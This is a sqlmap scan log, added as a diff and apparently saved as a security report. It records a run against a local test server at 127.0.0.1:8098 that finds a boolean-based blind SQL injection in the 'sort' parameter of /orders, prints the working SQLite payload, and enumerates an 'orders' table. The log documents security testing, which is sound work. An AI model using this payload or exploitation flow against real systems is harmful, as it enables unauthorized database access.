@@ -1,0 +1,78 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:18:07 /2026-11-07/
+
+[22:18:07] [WARNING] using '/opt/ares/security_reports/test-vuln-hard_20261107T211731Z/sqlmap' as the output directory
+[1/1] URL:
+GET http://127.0.0.1:8098/orders?sort=1
+do you want to test this URL? [Y/n/q]
+> Y
+[22:18:07] [INFO] testing URL 'http://127.0.0.1:8098/orders?sort=1'
+[22:18:07] [INFO] flushing session file
+[22:18:07] [INFO] using '/opt/ares/security_reports/test-vuln-hard_20261107T211731Z/sqlmap/results-11072026_1018pm.csv' as the CSV results file in multiple targets mode
+[22:18:07] [INFO] testing connection to the target URL
+[22:18:07] [INFO] checking if the target is protected by some kind of WAF/IPS
+[22:18:07] [INFO] testing if the target URL content is stable
+[22:18:08] [INFO] target URL content is stable
+[22:18:08] [INFO] testing if GET parameter 'sort' is dynamic
+[22:18:08] [WARNING] GET parameter 'sort' does not appear to be dynamic
+[22:18:08] [WARNING] heuristic (basic) test shows that GET parameter 'sort' might not be injectable
+[22:18:08] [INFO] testing for SQL injection on GET parameter 'sort'
+[22:18:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:18:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[22:18:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[22:18:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[22:18:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[22:18:10] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[22:18:10] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[22:18:11] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[22:18:11] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[22:18:12] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[22:18:12] [INFO] GET parameter 'sort' appears to be 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' injectable (with --code=200)
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) and risk (2) values? [Y/n] Y
+[22:18:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[22:18:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[22:18:12] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[22:18:12] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[22:18:13] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[22:18:13] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[22:18:13] [INFO] checking if the injection point on GET parameter 'sort' is a false positive
+GET parameter 'sort' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 441 HTTP(s) requests:
+---
+Parameter: sort (GET)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: sort=1 AND CASE WHEN 7281=7281 THEN 7281 ELSE JSON(CHAR(89,116,81,117)) END
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[22:18:13] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[22:18:13] [INFO] fetching tables for database: 'SQLite_masterdb'
+[22:18:13] [INFO] fetching number of tables for database 'SQLite_masterdb'
+[22:18:13] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+
+[22:18:13] [INFO] retrieved: 1
+
+[22:18:14] [INFO] retrieved: orders
+<current>
+[1 table]
++--------+
+| orders |
++--------+
+
+[22:18:14] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 454 times
+[22:18:14] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/opt/ares/security_reports/test-vuln-hard_20261107T211731Z/sqlmap/results-11072026_1018pm.csv'
+[22:18:14] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 22:18:14 /2026-11-07/
+
